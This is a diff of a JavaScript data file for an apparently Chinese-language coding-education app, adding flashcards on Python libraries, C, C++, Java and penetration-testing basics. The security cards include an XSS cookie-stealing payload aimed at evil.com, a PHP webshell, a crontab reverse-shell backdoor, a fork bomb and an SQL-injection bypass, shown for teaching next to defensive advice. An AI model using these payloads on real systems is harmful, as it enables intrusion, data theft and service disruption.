-                { id: 803, title: "监督学习", description: "有标签数据", difficulty: 1, xp: 15, courseType: "ai", question: "使用带标签数据训练的学习方式？", template: "# ___学习需要标注好的训练数据", answer: "监督", hint: "Supervised", explanation: "📌 监督学习使用带标签的数据进行训练" },
-                { id: 804, title: "激活函数", description: "神经网络组件", difficulty: 2, xp: 20, courseType: "ai", question: "最常用的激活函数，输出max(0,x)？", template: "def ___(x):\n    return max(0, x)", answer: "relu", hint: "Rectified Linear Unit", explanation: "📌 ReLU是最常用的激活函数" },
-                { id: 805, title: "反向传播", description: "训练算法", difficulty: 2, xp: 25, courseType: "ai", question: "神经网络训练时传递梯度的算法？", template: "# ___传播算法用于更新权重", answer: "反向", hint: "Backward", explanation: "📌 反向传播(Backpropagation)计算梯度并更新权重" },
-                { id: 806, title: "损失函数", description: "评估误差", difficulty: 2, xp: 20, courseType: "ai", question: "衡量预测与实际差距的函数叫？", template: "# ___函数越小，模型越好\nloss = loss_fn(pred, label)", answer: "损失", hint: "Loss", explanation: "📌 损失函数(Loss Function)衡量模型预测的误差" },
-                { id: 807, title: "Prompt基础", description: "AI提示词", difficulty: 1, xp: 15, courseType: "ai", question: "给AI模型的输入指令叫什么？", template: "# 好的___能让AI给出更好的回答", answer: "Prompt", hint: "提示的英文", explanation: "📌 Prompt是与AI交互的关键，好的Prompt能获得更好的结果" },
-                { id: 808, title: "大语言模型", description: "LLM", difficulty: 2, xp: 20, courseType: "ai", question: "GPT、Claude这类AI属于什么模型？", template: "# ChatGPT是___语言模型", answer: "大", hint: "Large", explanation: "📌 大语言模型(LLM)能理解和生成自然语言" },
-                // ========== 更多C语言挑战 ==========
-                { id: 309, title: "条件语句", description: "if语句", difficulty: 1, xp: 10, courseType: "c", question: "条件判断用什么语句？", template: "___ (age >= 18) {\n    printf(\"成年\");\n}", answer: "if", hint: "如果的英文", explanation: "📌 if语句用于条件判断" },
-                { id: 310, title: "循环语句", description: "for循环", difficulty: 1, xp: 15, courseType: "c", question: "计数循环用什么语句？", template: "___ (int i = 0; i < 10; i++) {\n    printf(\"%d\", i);\n}", answer: "for", hint: "三部分循环", explanation: "📌 for循环适合已知次数的循环" },
-                { id: 311, title: "数组声明", description: "静态数组", difficulty: 1, xp: 15, courseType: "c", question: "声明整数数组的语法？", template: "int ___[10];", answer: "arr", hint: "array的缩写", explanation: "📌 C语言数组在声明时必须指定大小" },
-                { id: 312, title: "字符串复制", description: "strcpy函数", difficulty: 2, xp: 20, courseType: "c", question: "复制字符串的函数？", template: "char dest[50];\n___(dest, \"Hello\");", answer: "strcpy", hint: "string copy", explanation: "📌 strcpy将源字符串复制到目标" },
-                // ========== 更多C++挑战 ==========
-                { id: 409, title: "构造函数", description: "初始化对象", difficulty: 2, xp: 20, courseType: "cpp", question: "与类同名的初始化函数叫？", template: "class Person {\npublic:\n    ___(string n) { name = n; }\n};", answer: "Person", hint: "和类名一样", explanation: "📌 构造函数与类同名，用于初始化" },
-                { id: 410, title: "虚函数", description: "多态", difficulty: 3, xp: 30, courseType: "cpp", question: "实现多态的函数关键字？", template: "class Animal {\npublic:\n    ___ void speak() {}\n};", answer: "virtual", hint: "虚拟的英文", explanation: "📌 virtual使函数可被子类重写" },
-                { id: 411, title: "智能指针", description: "自动释放", difficulty: 3, xp: 30, courseType: "cpp", question: "独占所有权的智能指针？", template: "#include <memory>\n___<int> ptr(new int(10));", answer: "unique_ptr", hint: "唯一指针", explanation: "📌 unique_ptr独占资源所有权" },
-                { id: 412, title: "Lambda表达式", description: "匿名函数", difficulty: 3, xp: 30, courseType: "cpp", question: "Lambda表达式以什么开始？", template: "auto add = ___(int a, int b) { return a + b; };", answer: "[]", hint: "方括号", explanation: "📌 []是Lambda表达式的捕获列表" },
-                // ========== 更多Java挑战 ==========
-                { id: 509, title: "抽象类", description: "抽象方法", difficulty: 2, xp: 25, courseType: "java", question: "定义抽象类用什么关键字？", template: "___ class Shape {\n    abstract void draw();\n}", answer: "abstract", hint: "抽象的英文", explanation: "📌 abstract类不能实例化" },
-                { id: 510, title: "final关键字", description: "不可变", difficulty: 2, xp: 20, courseType: "java", question: "声明不可继承的类？", template: "___ class Constants {}", answer: "final", hint: "最终的英文", explanation: "📌 final类不能被继承" },
-                { id: 511, title: "静态方法", description: "类方法", difficulty: 2, xp: 20, courseType: "java", question: "类方法用什么修饰？", template: "public ___ int add(int a, int b) {\n    return a + b;\n}", answer: "static", hint: "静态的英文", explanation: "📌 static方法属于类而非实例" },
-                { id: 512, title: "泛型", description: "类型参数", difficulty: 3, xp: 30, courseType: "java", question: "泛型类型参数用什么表示？", template: "List<___> list = new ArrayList<>();", answer: "T", hint: "Type的首字母", explanation: "📌 T是常用的泛型类型参数" },
-                // ========== 更多CSS挑战 ==========
-                { id: 609, title: "边框圆角", description: "圆角效果", difficulty: 1, xp: 15, courseType: "css", question: "设置圆角的属性？", template: ".card {\n    ___: 10px;\n}", answer: "border-radius", hint: "边框-半径", explanation: "📌 border-radius设置圆角" },
-                { id: 610, title: "阴影", description: "盒子阴影", difficulty: 2, xp: 20, courseType: "css", question: "添加阴影的属性？", template: ".card {\n    ___: 0 4px 6px rgba(0,0,0,0.1);\n}", answer: "box-shadow", hint: "盒子-阴影", explanation: "📌 box-shadow添加元素阴影" },
-                { id: 611, title: "过渡动画", description: "平滑变化", difficulty: 2, xp: 20, courseType: "css", question: "添加过渡效果的属性？", template: ".btn {\n    ___: all 0.3s ease;\n}", answer: "transition", hint: "过渡的英文", explanation: "📌 transition使属性变化更平滑" },
-                { id: 612, title: "变换", description: "旋转缩放", difficulty: 2, xp: 25, courseType: "css", question: "旋转/缩放元素的属性？", template: ".icon:hover {\n    ___: rotate(45deg);\n}", answer: "transform", hint: "变换的英文", explanation: "📌 transform可旋转、缩放、移动元素" },
-                // ========== 更多JavaScript挑战 ==========
-                { id: 709, title: "数组遍历", description: "forEach方法", difficulty: 1, xp: 15, courseType: "javascript", question: "遍历数组的方法？", template: "arr.___(item => console.log(item));", answer: "forEach", hint: "对每个", explanation: "📌 forEach遍历数组每个元素" },
-                { id: 710, title: "数组映射", description: "map方法", difficulty: 2, xp: 20, courseType: "javascript", question: "转换数组元素的方法？", template: "const doubled = arr.___(x => x * 2);", answer: "map", hint: "映射的英文", explanation: "📌 map返回新数组" },
-                { id: 711, title: "数组过滤", description: "filter方法", difficulty: 2, xp: 20, courseType: "javascript", question: "筛选数组元素的方法？", template: "const evens = arr.___(x => x % 2 === 0);", answer: "filter", hint: "过滤的英文", explanation: "📌 filter返回符合条件的元素" },
-                { id: 712, title: "解构赋值", description: "对象解构", difficulty: 2, xp: 25, courseType: "javascript", question: "对象解构用什么括号？", template: "const ___ name, age } = person;", answer: "{", hint: "花括号", explanation: "📌 {}用于对象解构" },
-                // ========== 更多AI挑战 ==========
-                { id: 809, title: "卷积神经网络", description: "图像处理", difficulty: 2, xp: 25, courseType: "ai", question: "处理图像的神经网络简称？", template: "# ___常用于图像识别", answer: "CNN", hint: "Convolutional Neural Network", explanation: "📌 CNN卷积神经网络擅长图像处理" },
-                { id: 810, title: "循环神经网络", description: "序列处理", difficulty: 2, xp: 25, courseType: "ai", question: "处理序列数据的神经网络简称？", template: "# ___常用于文本和语音", answer: "RNN", hint: "Recurrent Neural Network", explanation: "📌 RNN循环神经网络处理序列数据" },
-                { id: 811, title: "自然语言处理", description: "文本AI", difficulty: 2, xp: 20, courseType: "ai", question: "让AI理解语言的技术简称？", template: "# ChatGPT使用___技术", answer: "NLP", hint: "Natural Language Processing", explanation: "📌 NLP自然语言处理让AI理解人类语言" },
-                { id: 812, title: "过拟合", description: "训练问题", difficulty: 2, xp: 25, courseType: "ai", question: "模型在训练集上表现好但测试差？", template: "# ___是机器学习常见问题", answer: "过拟合", hint: "Overfitting", explanation: "📌 过拟合指模型记住训练数据而非学习规律" }
-            ],
-            
-            // 成就系统
-            achievements: [
-                { id: 'first_card', name: '知识启蒙', icon: '📖', desc: '翻阅第一张知识卡片', condition: cards => cards >= 1 },
-                { id: 'card_5', name: '求知若渴', icon: '📚', desc: '翻阅5张知识卡片', condition: cards => cards >= 5 },
-                { id: 'card_10', name: '学富五车', icon: '🎓', desc: '翻阅10张知识卡片', condition: cards => cards >= 10 },
-                { id: 'first_challenge', name: '初露锋芒', icon: '⚔️', desc: '完成第一个挑战', condition: (_, challenges) => challenges >= 1 },
-                { id: 'challenge_5', name: '编程新星', icon: '⭐', desc: '完成5个挑战', condition: (_, challenges) => challenges >= 5 },
-                { id: 'challenge_10', name: '代码高手', icon: '💻', desc: '完成10个挑战', condition: (_, challenges) => challenges >= 10 },
-                { id: 'challenge_25', name: '算法达人', icon: '🧠', desc: '完成25个挑战', condition: (_, challenges) => challenges >= 25 },
-                { id: 'challenge_50', name: '编程大师', icon: '🏆', desc: '完成50个挑战', condition: (_, challenges) => challenges >= 50 },
-                { id: 'challenge_75', name: '代码专家', icon: '🎖️', desc: '完成75个挑战', condition: (_, challenges) => challenges >= 75 },
-                { id: 'challenge_100', name: '百题达人', icon: '💯', desc: '完成100个挑战', condition: (_, challenges) => challenges >= 100 },
-                { id: 'challenge_140', name: '传奇大师', icon: '👑', desc: '完成全部140个挑战', condition: (_, challenges) => challenges >= 140 },
-                { id: 'xp_100', name: '百分努力', icon: '💯', desc: '累计获得100经验值', condition: (_, __, xp) => xp >= 100 },
-                { id: 'xp_300', name: '修炼有成', icon: '🔥', desc: '累计获得300经验值', condition: (_, __, xp) => xp >= 300 },
-                { id: 'xp_500', name: '实力非凡', icon: '⚡', desc: '累计获得500经验值', condition: (_, __, xp) => xp >= 500 },
-                { id: 'xp_1000', name: '传奇程序员', icon: '👑', desc: '累计获得1000经验值', condition: (_, __, xp) => xp >= 1000 },
-                { id: 'streak_3', name: '小有成就', icon: '🎯', desc: '连续答对3题', condition: (_, __, ___, streak) => streak >= 3 },
-                { id: 'streak_5', name: '势如破竹', icon: '🚀', desc: '连续答对5题', condition: (_, __, ___, streak) => streak >= 5 },
-                { id: 'streak_10', name: '无人能挡', icon: '💎', desc: '连续答对10题', condition: (_, __, ___, streak) => streak >= 10 }
-            ],
-            
-            // ===== 项目实战 =====
-            projects: [
-                {
-                    id: 1,
-                    title: "🔢 简易计算器",
-                    description: "制作一个支持加减乘除的命令行计算器",
-                    difficulty: 1,
-                    xp: 50,
-                    skills: ["输入输出", "条件判断", "类型转换"],
-                    instructions: `## 项目目标
+            ]
+        },
+        {
+            category: "Tkinter GUI",
+            icon: "🖼️",
+            cards: [
+                {
+                    front: "如何创建一个窗口？",
+                    back: "使用Tk()创建主窗口，mainloop()让窗口保持显示。\n\n就像：打开电视(Tk)然后保持开着(mainloop)",
+                    code: "import tkinter as tk\n\n# 创建窗口\nroot = tk.Tk()\nroot.title('我的第一个窗口')\nroot.geometry('400x300')\n\n# 保持窗口显示\nroot.mainloop()"
+                },
+                {
+                    front: "什么是Label和Button？",
+                    back: "Label：显示文字或图片的标签\nButton：可点击的按钮\n\n就像：Label是告示牌，Button是门铃",
+                    code: "import tkinter as tk\n\nroot = tk.Tk()\n\n# 创建标签\nlabel = tk.Label(root, text='你好！')\nlabel.pack()\n\n# 创建按钮\ndef say_hi():\n    print('被点击了！')\n\nbtn = tk.Button(root, text='点我', command=say_hi)\nbtn.pack()\n\nroot.mainloop()"
+                },
+                {
+                    front: "pack() vs grid() 布局",
+                    back: "pack()：按顺序排列组件（上下或左右）\ngrid()：按表格方式排列（行和列）\n\n就像：pack是排队，grid是坐座位",
+                    code: "# pack布局：垂直排列\nlabel1.pack(side='top')\nlabel2.pack(side='top')\n\n# grid布局：表格排列\nlabel1.grid(row=0, column=0)\nlabel2.grid(row=0, column=1)\nlabel3.grid(row=1, column=0)"
+                }
+            ]
+        },
+        {
+            category: "Pandas数据处理",
+            icon: "📊",
+            cards: [
+                {
+                    front: "什么是DataFrame？",
+                    back: "DataFrame是Pandas的核心数据结构，就像Excel表格一样，有行和列。\n\n可以用来存储和处理表格数据",
+                    code: "import pandas as pd\n\n# 创建DataFrame\ndata = {\n    '姓名': ['小明', '小红'],\n    '年龄': [18, 17]\n}\ndf = pd.DataFrame(data)\nprint(df)"
+                },
+                {
+                    front: "如何读取Excel文件？",
+                    back: "使用read_excel()读取，to_excel()保存。\n\n就像打开和保存Word文档一样简单",
+                    code: "import pandas as pd\n\n# 读取Excel\ndf = pd.read_excel('数据.xlsx')\n\n# 查看数据\nprint(df.head())  # 前5行\n\n# 保存Excel\ndf.to_excel('新数据.xlsx', index=False)"
+                },
+                {
+                    front: "如何筛选数据？",
+                    back: "使用条件表达式筛选符合条件的行。\n\n就像：从学生中找出年龄大于18的",
+                    code: "import pandas as pd\n\n# 筛选年龄>18的行\nadults = df[df['年龄'] > 18]\n\n# 筛选特定城市\nbeijing = df[df['城市'] == '北京']\n\n# 多条件筛选\nresult = df[(df['年龄'] > 18) & (df['城市'] == '北京')]"
+                }
+            ]
+        },
+        {
+            category: "网络爬虫",
+            icon: "🕷️",
+            cards: [
+                {
+                    front: "requests是什么？",
+                    back: "requests是Python的HTTP库，用来发送网络请求获取网页内容。\n\n就像：派一个人去网站把内容带回来",
+                    code: "import requests\n\n# 发送GET请求\nresponse = requests.get('https://example.com')\n\n# 获取网页内容\nhtml = response.text\nprint(html[:100])  # 打印前100字符"
+                },
+                {
+                    front: "BeautifulSoup怎么用？",
+                    back: "BeautifulSoup用来解析HTML，提取需要的数据。\n\n就像：把一本书拆开，找到你要的章节",
+                    code: "from bs4 import BeautifulSoup\n\nhtml = '<h1>标题</h1><p>内容</p>'\nsoup = BeautifulSoup(html, 'html.parser')\n\n# 查找元素\ntitle = soup.find('h1').text\nprint(title)  # 标题\n\n# 查找所有\nall_p = soup.find_all('p')"
+                },
+                {
+                    front: "什么是反爬虫？",
+                    back: "网站会检测并阻止爬虫。常见应对方法：\n1. 设置User-Agent伪装浏览器\n2. 添加延迟避免过快\n3. 使用代理IP",
+                    code: "import requests\nimport time\n\n# 伪装浏览器\nheaders = {\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'\n}\n\n# 发送请求\nresponse = requests.get(url, headers=headers)\n\n# 添加延迟\ntime.sleep(0.5)"
+                }
+            ]
+        },
+        // ========== 网络安全分类 ==========
+        {
+            category: "渗透测试基础",
+            icon: "🔍",
+            courseType: "security",
+            cards: [
+                {
+                    front: "什么是渗透测试？",
+                    back: "渗透测试是经过授权的安全测试，模拟黑客攻击来发现系统漏洞。\n\n就像：请专业人员测试你家的锁是否安全",
+                    code: "# 渗透测试基本流程\n1. 信息收集 → 了解目标\n2. 漏洞扫描 → 发现弱点\n3. 漏洞利用 → 验证风险\n4. 报告编写 → 提出建议"
+                },
+                {
+                    front: "什么是HTTP请求？",
+                    back: "HTTP是浏览器和服务器通信的协议。\n\n就像：你点餐(请求)，餐厅上菜(响应)",
+                    code: "# GET请求 - 获取数据\nGET /index.html HTTP/1.1\nHost: example.com\n\n# POST请求 - 提交数据\nPOST /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin&password=123"
+                },
+                {
+                    front: "什么是漏洞？",
+                    back: "漏洞是系统中的安全缺陷，可能被攻击者利用。\n\n常见漏洞类型：\n• 文件上传漏洞\n• SQL注入\n• XSS跨站脚本\n• 命令注入",
+                    code: "# 漏洞危害等级\n严重(Critical) - 可完全控制系统\n高危(High) - 可获取敏感数据\n中危(Medium) - 可影响部分功能\n低危(Low) - 影响较小"
+                }
+            ]
+        },
+        {
+            category: "常见漏洞类型",
+            icon: "⚠️",
+            courseType: "security",
+            cards: [
+                {
+                    front: "什么是竞态条件漏洞？",
+                    back: "竞态条件是时间窗口漏洞，在系统处理过程中的短暂间隙进行攻击。\n\n就像：在保安到达前，你先进了门",
+                    code: "# 竞态条件利用原理\n1. 上传文件\n2. 服务器检查文件(需要时间)\n3. 在检查完成前快速访问\n4. 文件被执行！\n\n# 防御方法\n使用文件锁或原子操作"
+                },
+                {
+                    front: "什么是SQL注入？",
+                    back: "SQL注入是通过用户输入注入恶意SQL代码，操纵数据库。\n\n就像：在表格里填写特殊内容，让系统执行你的命令",
+                    code: "# 正常登录\nSELECT * FROM users \nWHERE username='admin' AND password='123'\n\n# SQL注入攻击\n输入: admin' OR '1'='1\nSELECT * FROM users \nWHERE username='admin' OR '1'='1'--'\n# 永远为真，绕过登录！"
+                },
+                {
+                    front: "什么是XSS跨站脚本？",
+                    back: "XSS是在网页中注入恶意脚本，当其他用户访问时执行。\n\n分类：\n• 存储型XSS - 存入数据库\n• 反射型XSS - URL参数\n• DOM型XSS - 前端代码",
+                    code: "# XSS攻击示例\n&lt;script&gt;alert('XSS')&lt;/script&gt;\n\n# 窃取Cookie\n&lt;script&gt;\nnew Image().src='http://evil.com/steal?c='+document.cookie\n&lt;/script&gt;\n\n# 防御：转义HTML特殊字符"
+                },
+                {
+                    front: "什么是文件上传漏洞？",
+                    back: "允许上传恶意文件（如WebShell），获得服务器控制权。\n\n危害：远程代码执行(RCE)",
+                    code: "# WebShell示例\n<?php system($_GET['c']); ?>\n\n# 访问执行命令\nhttp://target.com/shell.php?c=whoami\n\n# 防御方法\n1. 白名单验证文件类型\n2. 随机重命名文件\n3. 禁止上传目录执行"
+                }
+            ]
+        },
+        {
+            category: "WebShell与后门",
+            icon: "🐚",
+            courseType: "security",
+            cards: [
+                {
+                    front: "什么是WebShell？",
+                    back: "WebShell是网页形式的命令行，让你通过浏览器执行服务器命令。\n\n就像：在网页上开了一个远程终端",
+                    code: "# 最简单的PHP WebShell\n<?php system($_GET['c']); ?>\n\n# 使用方法\nhttp://target.com/shell.php?c=ls\nhttp://target.com/shell.php?c=cat /etc/passwd"
+                },
+                {
+                    front: "WebShell常用命令",
+                    back: "通过WebShell可以执行各种系统命令：\n\n• whoami - 当前用户\n• pwd - 当前目录\n• ls -la - 列出文件\n• cat file - 读取文件",
+                    code: "# 常用命令\n?c=whoami          # 查看用户\n?c=pwd             # 当前目录\n?c=ls -la          # 列出文件\n?c=cat /etc/passwd # 读取文件\n?c=uname -a        # 系统信息\n?c=ps aux          # 进程列表"
+                },
+                {
+                    front: "什么是持久化后门？",
+                    back: "持久化后门是保持长期访问权限的方法，即使漏洞被修复也能继续访问。\n\n就像：配了一把备用钥匙",
+                    code: "# 创建持久化WebShell\n<?php\n// 隐藏的后门代码\nif(isset($_GET['backdoor'])){\n    system($_GET['backdoor']);\n}\n?>\n\n# 定时任务后门\ncrontab -e\n* * * * * /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"
+                }
+            ]
+        },
+        {
+            category: "DoS攻击原理",
+            icon: "💥",
+            courseType: "security",
+            cards: [
+                {
+                    front: "什么是DoS攻击？",
+                    back: "DoS(拒绝服务)攻击通过耗尽系统资源，使正常服务不可用。\n\nDDoS是分布式DoS，使用多台机器同时攻击。",
+                    code: "# DoS攻击类型\n1. 带宽耗尽 - 发送大量流量\n2. 资源耗尽 - 占用CPU/内存\n3. 应用层攻击 - 大量HTTP请求\n\n# 影响\n- 服务器响应缓慢\n- 正常用户无法访问\n- 业务中断"
+                },
+                {
+                    front: "资源耗尽攻击",
+                    back: "通过消耗服务器的CPU、内存、进程等资源使其瘫痪。\n\n类型：\n• CPU炸弹 - 无限循环\n• 内存炸弹 - 填满内存\n• Fork炸弹 - 创建大量进程",
+                    code: "# Fork炸弹示例(危险!)\n:(){ :|:& };:\n\n# Python资源消耗\nimport threading\ndef bomb():\n    while True:\n        threading.Thread(target=bomb).start()\n\n⚠️ 仅用于学习，禁止非法使用！"
+                },
+                {
+                    front: "如何防御DoS攻击？",
+                    back: "防御DoS需要多层防护：\n\n1. 流量清洗\n2. CDN分发\n3. 限流限速\n4. 资源隔离",
+                    code: "# 服务器防护配置\n# 限制连接数\niptables -A INPUT -p tcp --syn -m limit \\\n  --limit 1/s --limit-burst 3 -j ACCEPT\n\n# 限制进程资源\nulimit -u 100   # 最大进程数\nulimit -m 1024000  # 最大内存"
+                }
+            ]
+        },
+        {
+            category: "安全防御",
+            icon: "🛡️",
+            courseType: "security",
+            cards: [
+                {
+                    front: "如何防止文件上传漏洞？",
+                    back: "文件上传安全的核心是：不信任任何用户输入\n\n关键措施：\n• 白名单验证\n• 随机文件名\n• 独立存储目录\n• 禁止执行权限",
+                    code: "# 安全的文件上传\nallowed_types = ['.jpg', '.png', '.pdf']\n\n# 1. 验证扩展名\nif ext not in allowed_types:\n    return '不允许的文件类型'\n\n# 2. 随机文件名\nimport uuid\nfilename = str(uuid.uuid4()) + ext\n\n# 3. 禁止执行\nos.chmod(filepath, 0o644)"
+                },
+                {
+                    front: "如何防止SQL注入？",
+                    back: "SQL注入防御的核心：参数化查询\n\n永远不要拼接SQL语句！",
+                    code: "# ❌ 错误做法 - 拼接SQL\nsql = f\"SELECT * FROM users WHERE id={user_id}\"\n\n# ✅ 正确做法 - 参数化查询\ncursor.execute(\n    \"SELECT * FROM users WHERE id = %s\",\n    (user_id,)\n)\n\n# 使用ORM框架\nUser.query.filter_by(id=user_id).first()"
+                },
+                {
+                    front: "安全开发最佳实践",
+                    back: "安全开发OWASP原则：\n\n1. 输入验证\n2. 输出编码\n3. 最小权限\n4. 纵深防御\n5. 安全默认",
+                    code: "# 安全开发清单\n✓ 所有输入都要验证\n✓ 所有输出都要编码\n✓ 使用HTTPS加密传输\n✓ 密码加盐哈希存储\n✓ 实施访问控制\n✓ 记录安全日志\n✓ 定期安全测试"
+                }
+            ]
+        },
+        // ========== C语言 ==========
+        {
+            category: "C语言基础",
+            icon: "⚙️",
+            courseType: "c",
+            cards: [
+                { front: "什么是C语言？", back: "C语言是一种通用的、过程式的编程语言\n\n特点：\n• 接近硬件，运行效率高\n• 可移植性强\n• 是很多语言的基础", code: "#include <stdio.h>\n\nint main() {\n    printf(\"Hello, C!\\n\");\n    return 0;\n}" },
+                { front: "C语言的数据类型", back: "C语言基本数据类型：\n\n• int - 整数\n• float - 单精度浮点\n• double - 双精度浮点\n• char - 字符", code: "int age = 18;\nfloat price = 9.99;\ndouble pi = 3.14159265;\nchar grade = 'A';" },
+                { front: "printf格式化输出", back: "printf用于格式化输出\n\n常用格式符：\n• %d - 整数\n• %f - 浮点数\n• %c - 字符\n• %s - 字符串", code: "int num = 10;\nfloat f = 3.14;\nprintf(\"整数: %d\\n\", num);\nprintf(\"浮点: %.2f\\n\", f);\nprintf(\"字符: %c\\n\", 'A');" },
+                { front: "scanf输入函数", back: "scanf用于读取用户输入\n\n注意：变量前要加 & 取地址", code: "int age;\nprintf(\"请输入年龄: \");\nscanf(\"%d\", &age);\nprintf(\"你的年龄是: %d\\n\", age);" }
+            ]
+        },
+        {
+            category: "指针与内存",
+            icon: "📍",
+            courseType: "c",
+            cards: [
+                { front: "什么是指针？", back: "指针是存储内存地址的变量\n\n• & - 取地址运算符\n• * - 解引用运算符", code: "int num = 10;\nint *ptr = &num;  // ptr存储num的地址\n\nprintf(\"num的值: %d\\n\", num);\nprintf(\"num的地址: %p\\n\", &num);\nprintf(\"ptr指向的值: %d\\n\", *ptr);" },
+                { front: "指针与数组", back: "数组名就是指向首元素的指针\n\n数组和指针可以互换使用", code: "int arr[] = {1, 2, 3, 4, 5};\nint *p = arr;  // p指向arr[0]\n\nprintf(\"%d\\n\", arr[0]);  // 1\nprintf(\"%d\\n\", *p);      // 1\nprintf(\"%d\\n\", *(p+1));  // 2" },
+                { front: "动态内存分配", back: "使用malloc/free管理动态内存\n\n• malloc - 分配内存\n• free - 释放内存", code: "#include <stdlib.h>\n\nint *arr = (int*)malloc(5 * sizeof(int));\nif (arr == NULL) {\n    printf(\"内存分配失败\\n\");\n    return 1;\n}\n// 使用内存...\nfree(arr);  // 释放内存" }
+            ]
+        },
+        {
+            category: "结构体与文件",
+            icon: "📦",
+            courseType: "c",
+            cards: [
+                { front: "什么是结构体？", back: "结构体是自定义的数据类型\n可以包含不同类型的成员", code: "struct Student {\n    char name[50];\n    int age;\n    float score;\n};\n\nstruct Student s1;\nstrcpy(s1.name, \"张三\");\ns1.age = 18;\ns1.score = 95.5;" },
+                { front: "文件操作", back: "C语言文件操作：\n• fopen - 打开文件\n• fclose - 关闭文件\n• fprintf/fscanf - 读写", code: "FILE *fp = fopen(\"test.txt\", \"w\");\nif (fp != NULL) {\n    fprintf(fp, \"Hello File!\\n\");\n    fclose(fp);\n}" }
+            ]
+        },
+        // ========== C++ ==========
+        {
+            category: "C++基础",
+            icon: "🔧",
+            courseType: "cpp",
+            cards: [
+                { front: "C++与C的区别", back: "C++是C的超集，增加了：\n\n• 面向对象\n• 类和对象\n• 引用\n• 命名空间\n• STL标准库", code: "#include <iostream>\nusing namespace std;\n\nint main() {\n    cout << \"Hello C++!\" << endl;\n    return 0;\n}" },
+                { front: "C++的输入输出", back: "C++使用流对象：\n• cout - 输出\n• cin - 输入\n• endl - 换行", code: "#include <iostream>\nusing namespace std;\n\nint age;\ncout << \"请输入年龄: \";\ncin >> age;\ncout << \"你的年龄是: \" << age << endl;" },
+                { front: "引用与指针", back: "引用是变量的别名\n\n• 引用必须初始化\n• 引用不能改变指向\n• 引用更安全易用", code: "int num = 10;\nint &ref = num;  // ref是num的别名\n\nref = 20;\ncout << num << endl;  // 20\ncout << ref << endl;  // 20" }
+            ]
+        },
+        {
+            category: "类与对象",
+            icon: "🎯",
+            courseType: "cpp",
+            cards: [
+                { front: "如何定义类？", back: "类是面向对象的核心\n\n包含：\n• 成员变量（属性）\n• 成员函数（方法）\n• 访问修饰符", code: "class Student {\nprivate:\n    string name;\n    int age;\npublic:\n    void setName(string n) { name = n; }\n    string getName() { return name; }\n};" },
+                { front: "构造函数与析构函数", back: "构造函数：创建对象时调用\n析构函数：销毁对象时调用", code: "class Person {\npublic:\n    Person() { cout << \"创建对象\" << endl; }\n    ~Person() { cout << \"销毁对象\" << endl; }\n};\n\nPerson p;  // 调用构造函数\n// 作用域结束时调用析构函数" },
+                { front: "继承", back: "继承允许子类拥有父类的属性和方法\n\n• public继承最常用\n• 子类可以重写父类方法", code: "class Animal {\npublic:\n    void eat() { cout << \"吃东西\" << endl; }\n};\n\nclass Dog : public Animal {\npublic:\n    void bark() { cout << \"汪汪\" << endl; }\n};" }
+            ]
+        },
+        {
+            category: "STL标准库",
+            icon: "📚",
+            courseType: "cpp",
+            cards: [
+                { front: "什么是STL？", back: "STL = Standard Template Library\n\n包含：\n• 容器(vector, map等)\n• 算法(sort, find等)\n• 迭代器", code: "#include <vector>\n#include <algorithm>\n\nvector<int> nums = {3, 1, 4, 1, 5};\nsort(nums.begin(), nums.end());\n// nums: 1, 1, 3, 4, 5" },
+                { front: "vector动态数组", back: "vector是最常用的容器\n\n• 自动扩容\n• 支持随机访问\n• push_back添加元素", code: "vector<int> v;\nv.push_back(10);\nv.push_back(20);\n\nfor (int i = 0; i < v.size(); i++) {\n    cout << v[i] << endl;\n}" },
+                { front: "map映射", back: "map是键值对容器\n\n• 自动按键排序\n• 键唯一\n• O(log n)查找", code: "map<string, int> ages;\nages[\"张三\"] = 18;\nages[\"李四\"] = 20;\n\ncout << ages[\"张三\"] << endl;  // 18" }
+            ]
+        },
+        // ========== Java ==========
+        {
+            category: "Java基础",
+            icon: "☕",
+            courseType: "java",
+            cards: [
+                { front: "Java的特点", back: "Java特点：\n\n• 跨平台(Write Once, Run Anywhere)\n• 面向对象\n• 自动内存管理\n• 强类型语言", code: "public class Hello {\n    public static void main(String[] args) {\n        System.out.println(\"Hello Java!\");\n    }\n}" },
+                { front: "Java数据类型", back: "基本类型：\n• byte, short, int, long\n• float, double\n• char, boolean\n\n引用类型：类、数组、接口", code: "int age = 18;\ndouble price = 19.99;\nboolean isStudent = true;\nchar grade = 'A';\nString name = \"张三\";  // 引用类型" },
+                { front: "数组", back: "Java数组是固定长度的\n\n声明方式：\n• 类型[] 名称\n• new 类型[长度]", code: "// 方式1\nint[] arr1 = {1, 2, 3, 4, 5};\n\n// 方式2\nint[] arr2 = new int[5];\narr2[0] = 1;\n\n// 遍历\nfor (int num : arr1) {\n    System.out.println(num);\n}" }
+            ]
+        },
+        {
+            category: "Java面向对象",
+            icon: "🎯",
+            courseType: "java",
+            cards: [
+                { front: "类的定义", back: "Java类包含：\n• 成员变量\n• 构造方法\n• 成员方法\n• 访问修饰符", code: "public class Student {\n    private String name;\n    private int age;\n    \n    public Student(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n    \n    public String getName() {\n        return name;\n    }\n}" },
+                { front: "继承与多态", back: "继承：extends关键字\n多态：父类引用指向子类对象", code: "class Animal {\n    public void speak() {\n        System.out.println(\"动物叫\");\n    }\n}\n\nclass Dog extends Animal {\n    @Override\n    public void speak() {\n        System.out.println(\"汪汪\");\n    }\n}\n\nAnimal a = new Dog();\na.speak();  // 汪汪" },
+                { front: "接口", back: "接口定义行为规范\n\n• interface关键字\n• implements实现\n• 方法默认public abstract", code: "interface Flyable {\n    void fly();\n}\n\nclass Bird implements Flyable {\n    public void fly() {\n        System.out.println(\"鸟在飞\");\n    }\n}" }
+            ]
+        },
+        {
+            category: "Java集合框架",
+            icon: "📦",
+            courseType: "java",
+            cards: [
+                { front: "ArrayList", back: "ArrayList是动态数组\n\n• 有序、可重复\n• 随机访问快\n• 增删慢", code: "ArrayList<String> list = new ArrayList<>();\nlist.add(\"苹果\");\nlist.add(\"香蕉\");\n\nfor (String fruit : list) {\n    System.out.println(fruit);\n}" },
+                { front: "HashMap", back: "HashMap是键值对集合\n\n• 键唯一\n• 无序\n• 查找快O(1)", code: "HashMap<String, Integer> map = new HashMap<>();\nmap.put(\"张三\", 18);\nmap.put(\"李四\", 20);\n\nSystem.out.println(map.get(\"张三\"));  // 18" }
+            ]
+        },
+        // ========== CSS ==========
+        {
+            category: "CSS基础",
